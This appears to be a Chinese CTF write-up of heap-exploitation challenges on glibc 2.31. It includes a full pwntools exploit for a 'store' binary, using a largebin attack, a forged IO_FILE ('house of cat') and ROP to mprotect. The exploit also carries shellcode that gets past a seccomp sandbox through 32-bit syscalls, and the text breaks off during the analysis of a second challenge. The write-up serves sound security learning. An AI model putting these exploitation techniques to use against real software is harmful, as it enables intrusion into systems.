<p>虽然只能控制申请的头两个 chunk，但还是可以完成 largebin attack</p>
<p>于是我们先进行泄露，然后用 largebin attack 劫持 <code>_IO_list_all</code>，接下来有两种思路：</p>
<ul>
<li>house of cat</li>
<li>house of apple</li>
</ul>
<p><strong>House Of Cat</strong></p>
<p>house of cat 的常规调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmalloc -&gt; __malloc_assert -&gt; __fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>使 top chunk 不足以申请从而调用 <code>sysmalloc</code></li>
</ul>
<p>直接调用 <code>exit</code> 则会触发另一条调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__GI_exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>直接 <code>exit</code> 就好，不用破坏堆结构</li>
</ul>
<p>在本题目中需要注意两个问题：</p>
<ul>
<li>程序的沙盒禁止了 <code>open</code></li>
<li>“flag”文件的名称未知</li>
</ul>
<p>当不知道程序名称时，我们需要用 <code>getdents</code> 进行操作：</p>
<ul>
<li>先执行 <code>open(&#39;.&#39;,0)</code> 打开当前目录</li>
<li>然后执行 <code>getdents(3, buf, 0x200)</code></li>
</ul>
<p><code>open</code> 和 <code>getdents</code> 都被 ban 了，但是对应32位的 <code>open</code> 和 <code>getdents</code> 没有 ban</p>
<ul>
<li><code>sys_fstat-0x5</code> =&gt; <code>open-0x5</code></li>
<li><code>sys_setpriority-0x8D</code> =&gt; <code>getdents-0x8D</code></li>
</ul>
<p>Shellcode 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>这里先使用32位的 <code>mmap2</code> 申请一片空间</li>
<li>使用 <code>read</code> 读入“.”</li>
<li>然后依次执行32位的 <code>open</code> 和 <code>getdents</code></li>
<li>最后用 <code>write</code> 打印出来</li>
</ul>
<p>找到 “flag” 文件以后，对 shellcode 修改一下就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set debug-file-directory ./debug\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment"># unsortedbin</span></span><br><span class="line">add(<span class="number">0x460</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;&quot;</span>) <span class="comment"># largebin</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xb50</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps= libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;setcontext+61 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext+<span class="number">61</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">ret = <span class="number">0x0000000000022679</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>  + p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">shellcode = asm(</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;, arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x750</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x700</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload =  p64(payload_addr+<span class="number">0x10</span>) + p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x7000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(mprotect) + p64(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line">edit(<span class="number">0</span>,fake_IO_FILE,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">p.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">only: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">26f</span>d95677098954c2c6ee0e7543a029459dc6f97, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !free_num )                            </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk);                                </span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有个 UAF，但是 2.31 版本的 libc 有 tcache key，不能直接利用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( fill_key == <span class="number">0xDEADBEEF</span> )                 <span class="comment">// 限制一次</span></span><br><span class="line">  &#123;</span><br><span class="line">    fill_key = <span class="number">0</span>;</span><br><span class="line">    size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    